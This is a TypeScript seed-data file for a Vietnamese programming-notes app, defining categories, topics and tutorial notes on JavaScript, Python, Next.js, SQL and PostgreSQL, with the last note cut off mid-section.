import type { Category, Note, Topic } from './schema'

/**
 * Nội dung khởi tạo. Đây vừa là dữ liệu để app có cái đọc ngay, vừa là mẫu văn phong
 * cho các ghi chú viết sau: tiếng Việt, có code chạy được, giải thích "vì sao" chứ
 * không chỉ "cái gì".
 */

const NOW = '2026-08-17T00:00:00.000Z'

export const SEED_CATEGORIES: Category[] = [
  {
    id: 'cat-dev',
    name: 'Dev',
    slug: 'dev',
    description: 'Ngôn ngữ và framework để viết ứng dụng.',
    icon: 'Code2',
    color: 'sky',
    order: 1,
  },
  {
    id: 'cat-database',
    name: 'Database',
    slug: 'database',
    description: 'Lưu trữ, truy vấn và tối ưu dữ liệu.',
    icon: 'Database',
    color: 'emerald',
    order: 2,
  },
  {
    id: 'cat-security',
    name: 'Security',
    slug: 'security',
    description: 'Các lỗ hổng thường gặp và cách phòng tránh.',
    icon: 'ShieldCheck',
    color: 'rose',
    order: 3,
  },
  {
    id: 'cat-devops',
    name: 'DevOps',
    slug: 'devops',
    description: 'Đóng gói, triển khai và tự động hoá.',
    icon: 'Server',
    color: 'amber',
    order: 4,
  },
]

export const SEED_TOPICS: Topic[] = [
  {
    id: 'topic-typescript',
    categoryId: 'cat-dev',
    name: 'JavaScript / TypeScript',
    slug: 'javascript-typescript',
    description: 'Nền tảng của cả frontend lẫn Node.js.',
    order: 1,
  },
  {
    id: 'topic-python',
    categoryId: 'cat-dev',
    name: 'Python',
    slug: 'python',
    description: 'Script, xử lý dữ liệu, và backend.',
    order: 2,
  },
  {
    id: 'topic-nextjs',
    categoryId: 'cat-dev',
    name: 'Next.js',
    slug: 'nextjs',
    description: 'React framework với App Router và Server Components.',
    order: 3,
  },
  {
    id: 'topic-sql',
    categoryId: 'cat-database',
    name: 'SQL cơ bản',
    slug: 'sql-co-ban',
    description: 'Truy vấn nền tảng dùng được ở mọi hệ quản trị.',
    order: 1,
  },
  {
    id: 'topic-postgresql',
    categoryId: 'cat-database',
    name: 'PostgreSQL',
    slug: 'postgresql',
    description: 'Index, kế hoạch thực thi và các tính năng riêng của Postgres.',
    order: 2,
  },
  {
    id: 'topic-owasp',
    categoryId: 'cat-security',
    name: 'OWASP Top 10',
    slug: 'owasp-top-10',
    description: 'Mười nhóm lỗ hổng phổ biến nhất của ứng dụng web.',
    order: 1,
  },
  {
    id: 'topic-docker',
    categoryId: 'cat-devops',
    name: 'Docker',
    slug: 'docker',
    description: 'Đóng gói ứng dụng thành image chạy được ở mọi nơi.',
    order: 1,
  },
  {
    id: 'topic-cicd',
    categoryId: 'cat-devops',
    name: 'CI/CD (GitHub Actions)',
    slug: 'ci-cd-github-actions',
    description: 'Tự động kiểm thử và triển khai mỗi lần push.',
    order: 2,
  },
]

export const SEED_NOTES: Note[] = [
  {
    id: 'note-async-await',
    topicId: 'topic-typescript',
    title: 'async/await và event loop',
    slug: 'async-await-va-event-loop',
    summary: 'Vì sao code bất đồng bộ không chặn luồng chính, và async/await thực chất là gì.',
    content: `JavaScript chỉ có **một luồng** thực thi. Mọi thao tác chờ (đọc file, gọi API) đều phải giao cho môi trường bên ngoài rồi nhận kết quả qua hàng đợi callback — nếu không, giao diện sẽ đứng.

## Event loop trong một câu

Stack chạy hết code đồng bộ, sau đó event loop lấy việc từ hàng đợi ra chạy. Microtask (promise) được ưu tiên hơn macrotask (setTimeout):

\`\`\`ts
console.log('1')
setTimeout(() => console.log('2 - macrotask'), 0)
Promise.resolve().then(() => console.log('3 - microtask'))
console.log('4')
// Thứ tự in ra: 1, 4, 3 - microtask, 2 - macrotask
\`\`\`

## async/await là promise viết cho dễ đọc

\`await\` tạm dừng **hàm hiện tại**, không tạm dừng chương trình. Hàm \`async\` luôn trả về Promise:

\`\`\`ts
async function layNguoiDung(id: string): Promise<User> {
  const res = await fetch(\`/api/users/\${id}\`)
  if (!res.ok) throw new Error(\`HTTP \${res.status}\`)
  return res.json() as Promise<User>
}
\`\`\`

## Lỗi hay gặp: await tuần tự việc chạy song song được

\`\`\`ts
// Chậm: 2 lượt chờ nối tiếp nhau
const a = await layNguoiDung('1')
const b = await layNguoiDung('2')

// Nhanh: cùng khởi động, chờ một lần
const [a2, b2] = await Promise.all([layNguoiDung('1'), layNguoiDung('2')])
\`\`\`

## Ghi nhớ

- \`await\` chỉ dừng hàm chứa nó.
- Việc độc lập nhau thì gộp bằng \`Promise.all\`.
- Microtask luôn chạy trước macrotask.`,
    tags: ['javascript', 'bat-dong-bo', 'event-loop'],
    starred: true,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-type-vs-interface',
    topicId: 'topic-typescript',
    title: 'Type và Interface khác nhau ở đâu',
    slug: 'type-va-interface-khac-nhau-o-dau',
    summary: 'Khi nào nên dùng type alias, khi nào nên dùng interface, và vì sao đừng tranh cãi quá nhiều.',
    content: `Trong một buổi review code, hai người dùng \`type\` và \`interface\` để định nghĩa cùng một hình dạng dữ liệu, và không ai chỉ ra được cái nào sai — cả hai đều compile, đều báo lỗi kiểu giống nhau khi truyền thiếu field. Cuộc tranh cãi chỉ có ý nghĩa thật sự khi gặp tình huống cụ thể: mở rộng type của một thư viện ngoài, lúc đó cách khai báo bạn chọn quyết định việc có thêm được field mới vào hay không.

## Interface gộp được, type thì không

\`\`\`ts
interface User { id: string }
interface User { email: string }
// User giờ có cả id lẫn email (declaration merging)

type Product = { id: string }
// type Product = { price: number }  // Lỗi: định nghĩa trùng tên
\`\`\`

Tính chất này hữu ích khi mở rộng type của thư viện ngoài, nhưng trong code của mình thì thường là bất ngờ không mong muốn.

## Type làm được những thứ interface không làm được

\`\`\`ts
type Id = string | number                    // union
type Keys = keyof User                       // toán tử trên type
type Nullable<T> = T | null                  // generic alias
type Point = [number, number]                // tuple
\`\`\`

## Quy ước dùng trong dự án này

- Mô tả object công khai, có khả năng được mở rộng: \`interface\`.
- Mọi thứ còn lại (union, tuple, type suy ra từ zod): \`type\`.

\`\`\`ts
type Note = z.infer<typeof NoteSchema> // suy ra từ schema, không viết tay
\`\`\`

## Ghi nhớ

Chọn một quy ước rồi giữ nhất quán quan trọng hơn việc chọn cái nào.`,
    tags: ['typescript', 'type-system'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-server-vs-client-component',
    topicId: 'topic-nextjs',
    title: 'Server Component và Client Component',
    slug: 'server-component-va-client-component',
    summary: 'Mặc định mọi component trong App Router chạy ở server; chỉ đánh dấu "use client" khi thật sự cần.',
    content: `Trong App Router, component **mặc định chạy ở server**: nó không được gửi xuống trình duyệt, nên không tốn JavaScript phía client và được phép đọc dữ liệu trực tiếp.

## Server Component

\`\`\`tsx
// Không có "use client" -> chạy ở server
import * as notesRepo from '@/lib/db/notes.repo'

export default async function NotesPage() {
  const notes = await notesRepo.listAll() // đọc dữ liệu ngay trong component
  return <ul>{notes.map((n) => <li key={n.id}>{n.title}</li>)}</ul>
}
\`\`\`

## Client Component

Chỉ cần khi có **trạng thái**, **hiệu ứng**, hoặc **sự kiện của trình duyệt**:

\`\`\`tsx
'use client'
import { useState } from 'react'

export function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button onClick={() => { void navigator.clipboard.writeText(text); setCopied(true) }}>
      {copied ? 'Đã chép' : 'Chép'}
    </button>
  )
}
\`\`\`

## Quy tắc thực dụng

Đẩy \`"use client"\` xuống càng sâu càng tốt. Một component client kéo theo toàn bộ cây con của nó xuống client, nên đặt nó ở lá thay vì ở layout.

## Ghi nhớ

- Mặc định: server.
- \`"use client"\` khi cần \`useState\`/\`useEffect\`/\`onClick\`.
- Server Component **được** render Client Component; chiều ngược lại chỉ qua \`children\`.`,
    tags: ['nextjs', 'react', 'server-component'],
    starred: true,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-generic-trong-typescript',
    topicId: 'topic-typescript',
    title: 'Generic trong TypeScript',
    slug: 'generic-trong-typescript',
    summary:
      'Cách viết hàm và type dùng lại được cho nhiều kiểu dữ liệu mà không mất kiểm tra kiểu.',
    content: `Bạn viết một hàm \`first\` để lấy phần tử đầu tiên của mảng số, dùng rất tốt. Vài hôm sau cần hàm y hệt cho mảng chuỗi, rồi cho mảng object người dùng. Copy dán ba lần thì trùng lặp code; đổi kiểu tham số thành \`any\` thì hàm dùng được cho mọi thứ, nhưng TypeScript không còn biết phần tử trả về là gì — autocomplete biến mất và lỗi gõ nhầm field chỉ lộ ra lúc chạy.

## Hàm generic: một hàm, giữ nguyên kiểu

\`\`\`ts
function first<T>(items: T[]): T | undefined {
  return items[0]
}

const a = first([1, 2, 3])       // kiểu: number | undefined
const b = first(['x', 'y', 'z']) // kiểu: string | undefined
\`\`\`

\`T\` là tham số kiểu, TypeScript tự suy ra từ mảng truyền vào. Không cần khai báo kiểu tường minh, và kết quả vẫn được kiểm tra đầy đủ.

## Ràng buộc generic bằng extends

Đôi khi hàm cần \`T\` có sẵn một số thuộc tính, không chấp nhận kiểu bất kỳ:

\`\`\`ts
function getLength<T extends { length: number }>(value: T): number {
  return value.length
}

getLength('hello')   // 5, string có length
getLength([1, 2, 3]) // 3, array có length
// getLength(42)      // Lỗi: number không có length
\`\`\`

\`extends\` ở đây không phải kế thừa class, mà là ràng buộc: \`T\` phải tương thích với hình dạng phía sau.

## Generic trong interface

Một kiểu bao bọc dữ liệu, như phản hồi API, cũng nên là generic thay vì viết riêng cho từng loại dữ liệu:

\`\`\`ts
interface ApiResponse<T> {
  data: T
  error: string | null
}

type User = { id: string; name: string }

function ok(data: User): ApiResponse<User> {
  return { data, error: null }
}
\`\`\`

\`ApiResponse<User>\` và \`ApiResponse<Note>\` dùng chung một định nghĩa, chỉ khác tham số kiểu truyền vào.

## Ghi nhớ

- Generic giữ mối liên hệ giữa kiểu đầu vào và đầu ra mà \`any\` phá vỡ.
- \`extends\` trên tham số kiểu là ràng buộc hình dạng, không phải kế thừa class.
- Dùng generic cho code lặp lại cấu trúc nhưng khác kiểu dữ liệu, không phải cho mọi hàm.`,
    tags: ['typescript', 'generic'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-list-va-dict-comprehension',
    topicId: 'topic-python',
    title: 'List và dict comprehension',
    slug: 'list-va-dict-comprehension',
    summary: 'Cú pháp tạo list/dict trong một dòng, và khi nào thì vòng lặp thường dễ đọc hơn.',
    content: `Bạn viết bốn dòng vòng \`for\` chỉ để lọc số chẵn rồi bình phương chúng, trong khi code của đồng nghiệp gói gọn việc đó trong một dòng mà bạn phải đọc đi đọc lại mới hiểu nó làm gì. Comprehension không phải cú pháp bí hiểm — nó chỉ là vòng lặp viết theo thứ tự khác.

## List comprehension

\`\`\`python
numbers = range(10)
squares = [n * n for n in numbers if n % 2 == 0]
print(squares)  # [0, 4, 16, 36, 64]
\`\`\`

Đọc từ trái sang phải: lấy \`n * n\`, cho từng \`n\` trong \`numbers\`, nếu \`n\` chẵn.

## Dict comprehension: cùng cú pháp, thêm key

\`\`\`python
words = ["a", "bb", "ccc"]
by_length = {word: len(word) for word in words}
print(by_length)  # {'a': 1, 'bb': 2, 'ccc': 3}
\`\`\`

Khác list comprehension đúng một chỗ: thêm \`key:\` trước biểu thức giá trị.

## Khi vòng lặp thường vẫn rõ hơn

Khi có nhiều bước xử lý, cần log, hoặc cần dừng sớm, nhồi hết vào một dòng comprehension làm code khó đọc hơn là nhanh hơn:

\`\`\`python
result = []
for user in users:
    if not user.is_active:
        continue
    logger.info("Xu ly user %s", user.id)
    result.append(transform(user))
\`\`\`

## Ghi nhớ

- Comprehension hợp cho biến đổi + lọc đơn giản, đọc một dòng là hiểu ngay ý định.
- Nhiều điều kiện lồng nhau hoặc có side-effect (log, ghi file, gọi API) thì dùng vòng lặp thường.
- Dict comprehension chỉ khác list comprehension ở cặp \`key: value\` đứng trước \`for\`.`,
    tags: ['python', 'cu-phap'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-virtualenv-va-pip',
    topicId: 'topic-python',
    title: 'virtualenv và pip',
    slug: 'virtualenv-va-pip',
    summary: 'Vì sao mỗi dự án Python nên có môi trường riêng, và các lệnh cần nhớ.',
    content: `Hai dự án Python trên cùng một máy: một cần \`requests==2.25\`, một cần \`requests==2.31\`. Cài package thẳng vào Python hệ thống, \`pip install\` cho dự án sau sẽ ghi đè bản của dự án trước — và dự án trước lỗi ngay lần chạy tiếp theo, không báo trước.

## Tạo và bật môi trường ảo

\`\`\`bash
python3 -m venv .venv
source .venv/bin/activate   # Windows: .venv\\Scripts\\activate
\`\`\`

Sau khi bật, mọi \`pip install\` chỉ ảnh hưởng tới thư mục \`.venv\` của dự án hiện tại, không đụng tới Python hệ thống hay dự án khác.

## Cài đặt và ghi lại phiên bản đang dùng

\`\`\`bash
pip install requests==2.31.0
pip freeze > requirements.txt
\`\`\`

\`requirements.txt\` liệt kê chính xác phiên bản của mọi package, để máy khác cài lại y hệt:

\`\`\`bash
pip install -r requirements.txt
\`\`\`

## Thoát môi trường

\`\`\`bash
deactivate
\`\`\`

Câu lệnh này trả shell về trạng thái trước khi \`activate\`, không phải xoá \`.venv\`.

## Ghi nhớ

- Mỗi dự án một \`.venv\`, đừng cài package trực tiếp vào Python hệ thống.
- \`pip freeze > requirements.txt\` sau khi cài; \`pip install -r requirements.txt\` khi thiết lập máy mới.
- Thư mục \`.venv\` không commit vào git, chỉ commit \`requirements.txt\`.`,
    tags: ['python', 'moi-truong'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-type-hint-trong-python',
    topicId: 'topic-python',
    title: 'Type hint trong Python',
    slug: 'type-hint-trong-python',
    summary: 'Chú thích kiểu giúp IDE và mypy bắt lỗi sớm, dù Python không kiểm tra lúc chạy.',
    content: `Hàm \`tong(a, b)\` cộng hai số chạy tốt suốt nhiều tháng, tới khi một chỗ gọi truyền nhầm chuỗi \`"3"\` thay vì số \`3\`. Python không báo lỗi lúc đó — chương trình vẫn chạy, chỉ là kết quả trở thành \`"33"\` thay vì \`6\`, và bug chỉ lộ ra khi khách hàng report.

## Chú thích kiểu cho tham số và giá trị trả về

\`\`\`python
def tong(a: int, b: int) -> int:
    return a + b

tong("1", "2")  # mypy bao loi ngay, nhung Python van chay va noi chuoi thanh "12"
\`\`\`

Type hint không đổi hành vi lúc chạy — Python bỏ qua nó khi thực thi. Giá trị nằm ở việc IDE gạch đỏ dòng gọi sai kiểu, và công cụ kiểm tra tĩnh bắt lỗi trước khi deploy:

\`\`\`bash
mypy app.py
\`\`\`

## Optional cho giá trị có thể vắng mặt

\`\`\`python
from typing import Optional

def tim_user(user_id: str) -> Optional[dict]:
    if user_id not in database:
        return None
    return database[user_id]
\`\`\`

\`Optional[dict]\` báo cho người gọi biết kết quả có thể là \`None\`, buộc phải kiểm tra trước khi dùng thay vì gặp lỗi \`NoneType\` lúc chạy.

## Ghi nhớ

- Type hint chỉ có tác dụng với IDE và công cụ như mypy; Python không kiểm tra lúc chạy.
- Luôn khai báo kiểu trả về, nhất là khi hàm có thể trả \`None\`.
- Chạy \`mypy\` trong CI để lỗi kiểu bị chặn trước khi merge, không phải sau khi lên production.`,
    tags: ['python', 'type-hint'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-server-actions',
    topicId: 'topic-nextjs',
    title: 'Server Actions',
    slug: 'server-actions',
    summary: 'Gọi hàm chạy trên server thẳng từ form, không cần tự viết API route.',
    content: `Muốn lưu một ghi chú mới từ form, cách cũ là viết \`app/api/notes/route.ts\` nhận POST, tự parse JSON, gọi repo — chỉ để phục vụ đúng một form. Phía client còn phải tự \`fetch\`, tự quản lý trạng thái loading và lỗi mạng cho một thao tác đơn giản là submit.

## Định nghĩa Server Action

\`\`\`ts
// app/notes/actions.ts
'use server'

import * as notesRepo from '@/lib/db/notes.repo'

export async function createNote(formData: FormData) {
  const title = formData.get('title')
  if (typeof title !== 'string' || title.trim() === '') {
    throw new Error('Tieu de khong duoc de trong')
  }
  await notesRepo.create({ topicId: 'topic-typescript', title, summary: '', content: '' })
}
\`\`\`

\`'use server'\` đánh dấu mọi export trong file này là hàm chạy trên server, dù được gọi từ component nào.

## Gắn thẳng vào form, không cần fetch

\`\`\`tsx
// app/notes/new/page.tsx
import { createNote } from '../actions'

export default function NewNotePage() {
  return (
    <form action={createNote}>
      <input name="title" placeholder="Tieu de" />
      <button type="submit">Lưu</button>
    </form>
  )
}
\`\`\`

Next.js tự đóng gói lời gọi thành một request tới server; form vẫn hoạt động ngay cả khi JavaScript phía client chưa tải xong.

## Ghi nhớ

- Server Action là hàm \`async\` có \`'use server'\`, luôn chạy trên server dù gọi từ component client.
- Gắn trực tiếp vào thuộc tính \`action\` của \`<form>\`, thay cho việc tự viết API route và \`fetch\`.
- Vẫn phải validate dữ liệu trong action — request có thể không đến từ chính form đó.`,
    tags: ['nextjs', 'server-actions'],
    starred: true,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-caching-va-revalidate',
    topicId: 'topic-nextjs',
    title: 'Caching và revalidate',
    slug: 'caching-va-revalidate',
    summary: 'Next.js cache mặc định ở đâu, và cách làm dữ liệu mới hiện ra sau khi ghi.',
    content: `Bạn vừa thêm một ghi chú mới, quay lại trang danh sách nhưng ghi chú đó không xuất hiện — phải hard refresh vài lần mới thấy. Next.js đã cache kết quả \`fetch\` từ trước, và không tự biết dữ liệu vừa thay đổi.

## fetch được cache mặc định

\`\`\`ts
export async function getNotes() {
  const res = await fetch('https://api.example.com/notes', {
    next: { revalidate: 60 }, // dùng lại cache tối đa 60 giây rồi mới gọi lại
  })
  return res.json()
}
\`\`\`

Không truyền \`next.revalidate\`, App Router coi request đó là tĩnh và cache gần như vô thời hạn cho tới lần build sau.

## Xoá cache ngay sau khi ghi

\`\`\`ts
'use server'
import { revalidatePath } from 'next/cache'
import * as notesRepo from '@/lib/db/notes.repo'

export async function createNote(formData: FormData) {
  await notesRepo.create({
    topicId: 'topic-nextjs',
    title: String(formData.get('title')),
    summary: '',
    content: '',
  })
  revalidatePath('/notes') // trang /notes render lại với dữ liệu mới ở request kế tiếp
}
\`\`\`

## Ghi nhớ

- \`fetch\` trong Server Component được cache mặc định; đặt \`next: { revalidate }\` để giới hạn thời gian sống.
- Sau khi ghi dữ liệu, gọi \`revalidatePath\` (hoặc \`revalidateTag\`) để xoá cache của trang liên quan.
- Không thấy dữ liệu mới thường không phải bug ở database, mà là cache chưa được revalidate.`,
    tags: ['nextjs', 'caching'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-join-cac-loai',
    topicId: 'topic-sql',
    title: 'JOIN các loại',
    slug: 'join-cac-loai',
    summary: 'INNER, LEFT, RIGHT, FULL khác nhau thế nào qua một ví dụ hai bảng.',
    content: `Viết báo cáo "liệt kê mọi khách hàng cùng đơn hàng của họ" trên hai bảng \`users(id, name)\` và \`orders(id, user_id, total)\`, nhưng kết quả lại thiếu mất những khách chưa từng mua gì — vì kiểu JOIN mặc định chỉ giữ lại hàng khớp ở cả hai bảng.

## INNER JOIN: chỉ giữ hàng khớp cả hai bên

\`\`\`sql
SELECT u.name, o.total
FROM users u
INNER JOIN orders o ON o.user_id = u.id;
-- Khách chưa có đơn hàng nào sẽ không xuất hiện trong kết quả
\`\`\`

## LEFT JOIN: giữ toàn bộ bảng bên trái

\`\`\`sql
SELECT u.name, o.total
FROM users u
LEFT JOIN orders o ON o.user_id = u.id;
-- Mọi user đều có mặt; total là NULL với user chưa từng mua
\`\`\`

## RIGHT JOIN và FULL JOIN

\`\`\`sql
-- RIGHT JOIN: đối xứng với LEFT, giữ toàn bộ bảng bên phải (orders)
SELECT u.name, o.total
FROM users u
RIGHT JOIN orders o ON o.user_id = u.id;

-- FULL JOIN: hợp của LEFT và RIGHT, giữ mọi hàng của cả hai bảng
SELECT u.name, o.total
FROM users u
FULL JOIN orders o ON o.user_id = u.id;
\`\`\`

## Ghi nhớ

- INNER JOIN: chỉ hàng có khớp ở cả hai bảng, dễ làm mất dữ liệu nếu dùng nhầm chỗ cần LEFT.
- LEFT/RIGHT JOIN: giữ toàn bộ bảng chỉ định, cột của bảng còn lại là NULL nếu không khớp.
- FULL JOIN: hợp của LEFT và RIGHT, hữu ích khi cần rà soát dữ liệu mồ côi ở cả hai chiều.`,
    tags: ['sql', 'join'],
    starred: true,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-group-by-va-having',
    topicId: 'topic-sql',
    title: 'GROUP BY và HAVING',
    slug: 'group-by-va-having',
    summary: 'Gom nhóm để tổng hợp, và vì sao điều kiện trên hàm tổng hợp phải nằm ở HAVING.',
    content: `Muốn lọc "khách hàng đã đặt hơn 3 đơn", viết \`WHERE COUNT(*) > 3\` thì database báo lỗi ngay — \`WHERE\` chạy trước khi các hàng được gom nhóm, nên lúc đó chưa có \`COUNT(*)\` nào để so sánh.

## GROUP BY: gom hàng cùng giá trị thành một nhóm

\`\`\`sql
SELECT user_id, COUNT(*) AS so_don, SUM(total) AS tong_tien
FROM orders
GROUP BY user_id;
\`\`\`

Mỗi hàng kết quả giờ đại diện cho một \`user_id\`, không còn là một đơn hàng riêng lẻ.

## HAVING: điều kiện lọc sau khi đã gom nhóm

\`\`\`sql
SELECT user_id, COUNT(*) AS so_don, SUM(total) AS tong_tien
FROM orders
GROUP BY user_id
HAVING COUNT(*) > 3
ORDER BY tong_tien DESC;
\`\`\`

\`WHERE\` lọc từng hàng gốc trước khi gom nhóm; \`HAVING\` lọc trên kết quả đã tổng hợp. Có thể dùng cả hai trong cùng một câu:

\`\`\`sql
SELECT user_id, COUNT(*) AS so_don
FROM orders
WHERE total > 0      -- loc truoc: bo don gia tri am/hoan tien
GROUP BY user_id
HAVING COUNT(*) > 3;  -- loc sau: chi giu khach mua nhieu
\`\`\`

## Ghi nhớ

- Thứ tự thực thi thật sự: FROM -> WHERE -> GROUP BY -> HAVING -> SELECT -> ORDER BY.
- Điều kiện trên hàm tổng hợp (COUNT, SUM, AVG...) luôn nằm ở HAVING, không nằm ở WHERE.
- Lọc được ở WHERE thì đặt ở WHERE thay vì HAVING — giảm khối lượng dữ liệu trước khi gom nhóm sẽ nhanh hơn.`,
    tags: ['sql', 'aggregate'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-transaction-va-acid',
    topicId: 'topic-sql',
    title: 'Transaction và ACID',
    slug: 'transaction-va-acid',
    summary: 'Vì sao cần gói nhiều câu lệnh vào một giao dịch, và bốn tính chất của nó.',
    content: `Chuyển khoản giữa hai tài khoản cần hai câu UPDATE — trừ tiền tài khoản A, cộng tiền tài khoản B. Nếu server crash đúng lúc giữa hai câu lệnh, tiền biến mất khỏi A mà chưa kịp vào B.

## Gói nhiều câu lệnh vào một transaction

\`\`\`sql
BEGIN;

UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;

COMMIT;
\`\`\`

Nếu có lỗi giữa chừng (mất kết nối, ràng buộc bị vi phạm), gọi \`ROLLBACK\` thay vì \`COMMIT\` để hoàn tác toàn bộ:

\`\`\`sql
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
-- phat hien loi nghiep vu o tang ung dung
ROLLBACK; -- balance cua id = 1 tro lai ban dau, cau UPDATE thu hai chua tung chay
\`\`\`

## Bốn tính chất ACID

- **Atomicity**: cả giao dịch thành công hết hoặc thất bại hết, không có nửa chừng.
- **Consistency**: giao dịch đưa database từ trạng thái hợp lệ này sang trạng thái hợp lệ khác.
- **Isolation**: các giao dịch chạy song song không thấy trạng thái trung gian của nhau.
- **Durability**: sau khi COMMIT, dữ liệu tồn tại kể cả khi mất điện ngay sau đó.

## Ghi nhớ

- Từ hai câu lệnh phải cùng thành công hoặc cùng thất bại trở lên: bọc trong \`BEGIN\`...\`COMMIT\`.
- Gặp lỗi giữa transaction thì \`ROLLBACK\`, đừng để nó tự treo giữa chừng.
- ACID là lời hứa của database, không phải thứ ứng dụng phải tự cài đặt lại.`,
    tags: ['sql', 'transaction'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-index-va-khi-nao-nen-danh',
    topicId: 'topic-postgresql',
    title: 'Index và khi nào nên đánh',
    slug: 'index-va-khi-nao-nen-danh',
    summary: 'Index tăng tốc đọc nhưng làm chậm ghi — cách chọn cột đáng đánh index.',
    content: `Truy vấn tìm user theo email chạy nhanh lúc bảng còn vài nghìn dòng, nhưng chậm dần theo thời gian tới khi bảng có vài triệu dòng — dù không có gì trong code ứng dụng thay đổi. Database đang phải quét toàn bộ bảng cho mỗi lần tìm.

## Index tăng tốc đọc thế nào

\`\`\`sql
CREATE INDEX idx_users_email ON users (email);
\`\`\`

Không có index, tìm theo \`email\` là quét tuần tự cả bảng — chi phí tăng tuyến tính theo số dòng. Có index (mặc định là B-tree), Postgres tìm theo kiểu chia đôi, chi phí gần như không đổi dù bảng có 10 nghìn hay 10 triệu dòng.

## Cái giá phải trả: ghi chậm hơn

Mỗi \`INSERT\`, \`UPDATE\`, \`DELETE\` trên bảng phải cập nhật lại toàn bộ index liên quan, không chỉ ghi dữ liệu. Bảng càng nhiều index, ghi càng chậm và càng tốn dung lượng đĩa.

## Chọn cột đáng đánh index

- Cột xuất hiện trong \`WHERE\`, \`JOIN\`, \`ORDER BY\` thường xuyên.
- Cột có độ chọn lọc cao — nhiều giá trị phân biệt. Index trên cột \`boolean\` (chỉ 2 giá trị) gần như vô dụng.

\`\`\`sql
-- Kiểm tra Postgres có thật sự dùng index không
EXPLAIN SELECT * FROM users WHERE email = 'a@b.com';
\`\`\`

## Ghi nhớ

- Index tăng tốc \`SELECT\` nhưng làm chậm \`INSERT\`/\`UPDATE\`/\`DELETE\`.
- Đánh index cho cột trong \`WHERE\`/\`JOIN\`/\`ORDER BY\` có độ chọn lọc cao.
- Đừng đánh index "phòng khi cần" — mỗi index thừa là chi phí ghi thật, không phải lý thuyết.`,
    tags: ['postgresql', 'index', 'hieu-nang'],
    starred: true,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-doc-explain-analyze',
    topicId: 'topic-postgresql',
    title: 'Đọc EXPLAIN ANALYZE',
    slug: 'doc-explain-analyze',
    summary: 'Cách đọc kế hoạch thực thi để biết truy vấn chậm ở bước nào.',
    content: `Một API chậm hẳn so với tuần trước, nghi ngờ là do câu truy vấn nhưng nhìn vào SQL không thấy gì sai — cần biết chính xác bước nào trong kế hoạch thực thi đang ngốn thời gian, thay vì đoán mò.

## Chạy EXPLAIN ANALYZE

\`\`\`sql
EXPLAIN ANALYZE
SELECT u.name, COUNT(o.id)
FROM users u
LEFT JOIN orders o ON o.user_id = u.id
GROUP BY u.id;
\`\`\`

Khác \`EXPLAIN\` thường (chỉ ước tính), \`EXPLAIN ANALYZE\` thực sự chạy câu lệnh và đo thời gian từng bước.

## Đọc các con số quan trọng

- \`Seq Scan\` (quét tuần tự) hay \`Index Scan\` (dùng index) trên mỗi bảng.
- \`actual time=x..y rows=n loops=m\`: thời gian thực tế, số dòng, số lần lặp của bước đó.
- \`cost=start..total\`: chi phí ước tính của planner, chỉ để so sánh tương đối giữa các phương án.

## Dấu hiệu cần chú ý

- \`Seq Scan\` trên bảng lớn kèm điều kiện lọc chọn lọc cao thường có nghĩa là thiếu index.
- Số \`rows\` ước tính lệch xa số dòng thực tế nghĩa là thống kê của planner đã cũ:

\`\`\`sql
ANALYZE users;
\`\`\`

## Ghi nhớ

- \`EXPLAIN\` cho kế hoạch dự kiến; \`EXPLAIN ANALYZE\` chạy thật và đo thời gian từng bước.
- \`Seq Scan\` không phải lúc nào cũng xấu — trên bảng nhỏ nó thường nhanh hơn \`Index Scan\`.
- Ước tính \`rows\` lệch xa thực tế là dấu hiệu cần chạy lại \`ANALYZE\` trên bảng đó.`,
    tags: ['postgresql', 'explain', 'hieu-nang'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-kieu-du-lieu-nen-dung',
    topicId: 'topic-postgresql',
    title: 'Kiểu dữ liệu nên dùng',
    slug: 'kieu-du-lieu-nen-dung',
    summary: 'text, timestamptz, numeric, jsonb — chọn đúng kiểu ngay từ đầu đỡ phải migrate.',
    content: `Một bảng dùng \`varchar(255)\` cho mọi cột chữ, \`float\` cho giá tiền, \`timestamp\` không kèm múi giờ cho ngày tạo. Vài tháng sau hệ thống mở rộng ra nhiều múi giờ, và một khách hàng report số tiền lệch vài xu do sai số làm tròn — cả hai lỗi đều xuất phát từ việc chọn sai kiểu dữ liệu ngay từ đầu.

## Chọn đúng kiểu ngay từ đầu

\`\`\`sql
CREATE TABLE products (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name text NOT NULL,
  price numeric(12, 2) NOT NULL,
  created_at timestamptz NOT NULL DEFAULT now(),
  metadata jsonb NOT NULL DEFAULT '{}'
);
\`\`\`

- \`text\` thay cho \`varchar(n)\`: Postgres không có lợi thế hiệu năng nào khi giới hạn độ dài, chỉ nên giới hạn khi nghiệp vụ thật sự yêu cầu.
- \`numeric\` cho tiền tệ: chính xác tuyệt đối, không có sai số làm tròn như số thực dấu phẩy động.
- \`timestamptz\` cho mọi mốc thời gian: Postgres luôn lưu quy về UTC, tự quy đổi ra múi giờ của client khi đọc.
- \`jsonb\` cho dữ liệu nửa cấu trúc: vẫn truy vấn và đánh index được, không như lưu chuỗi JSON thô trong \`text\`.

## Vì sao không dùng số thực cho tiền

\`\`\`sql
SELECT 0.1::float8 + 0.2::float8; -- 0.30000000000000004, sai lệch do biểu diễn nhị phân
SELECT 0.1::numeric + 0.2::numeric; -- 0.3, chính xác tuyệt đối
\`\`\`

## Ghi nhớ
